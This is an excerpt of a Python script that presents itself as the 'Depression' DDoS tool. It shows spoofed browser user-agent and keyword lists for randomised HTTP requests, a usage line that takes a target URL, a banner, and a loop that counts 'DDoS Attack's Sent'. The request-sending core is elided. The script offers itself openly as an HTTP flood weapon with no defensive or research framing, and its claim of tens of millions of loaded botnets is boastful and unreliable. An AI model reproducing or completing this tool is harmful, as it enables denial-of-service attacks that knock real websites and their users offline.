...
def referer_list():
	...
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
...
def keyword_list():
        ...
        keyword_top.append('Ps')
        keyword_top.append('Galaxy')
        keyword_top.append('XXXTENTACION')
        keyword_top.append('Make out hill')
        keyword_top.append('Depression & Obsession')
...
def usage():
	print ('Depression Version 3.7 DDoS Tool Created By ImReloaded And Nutcracker181 ')
	print ('New loaded Botnets: 39,445,657')
	print ('Usage: Depression (url)')
	print ('Example: Depression.py http://Example.com/')
	print ("\a")
print (  \
'''
'''+B+'''XXXXXXX         XXXXXXX	XXXXXXX         XXXXXXX XXXXXXX         XXXXXXX
 XXXXXXX       XXXXXXX   XXXXXXX       XXXXXXX   XXXXXXX       XXXXXXX
  XXXXXXX     XXXXXXX     XXXXXXX     XXXXXXX     XXXXXXX     XXXXXXX
   XXXXXXX   XXXXXXX       XXXXXXX   XXXXXXX       XXXXXXX   XXXXXXX
    XXXXXXX XXXXXXX         XXXXXXX XXXXXXX         XXXXXXX  XXXXXXX
    '''+G+''' XIMXRELOADEDX           XIMXRELOADEDX           XIMXRELOADEDX
'''+B+'''    XXXXXXX XXXXXXX         XXXXXXX XXXXXXX         XXXXXXX XXXXXXX
   XXXXXXX   XXXXXXX       XXXXXXX   XXXXXXX       XXXXXXX   XXXXXXX
  XXXXXXX     XXXXXXX     XXXXXXX     XXXXXXX     XXXXXXX     XXXXXXX
 XXXXXXX       XXXXXXX   XXXXXXX       XXXXXXX   XXXXXXX       XXXXXXX
...
'''+P+'''# XXXTENTACION - Depression And Obsession
# Depression And obsession Dont Mix Well
# Im Poisoned And My Body Dont Feel Well
'''+O+'''_________________________________________________________________
''')
...
safe = 0
request_counter = 0
headers_useragents = ['Mozilla/5.0', 'Safari/537.36'] 
headers_referers = ['http://example.com'] 
host = ""
    ...
    def run(self):
        ...
        while flag == 0:
            if previous + 150 < request_counter and previous != request_counter:
                print(f"#~~~> Depression DDoS Attack's Sent: {request_counter} Sending more <~~~#")
                previous = request_counter
        if flag == 2:
            print("\n ~> Stopping the mass DDoS Attack <~")

def signal_handler(signum, frame):
    print("\nSignal received, stopping the script...")
    set_flag(2) 
    sys.exit()
...
if len(sys.argv) < 2:
    ...
    if sys.argv[1] == "help":
        ...
        print("Starting the Depression in webserver DDoS Tool")
        print("Created By ImReloaded And Nutcracker181")
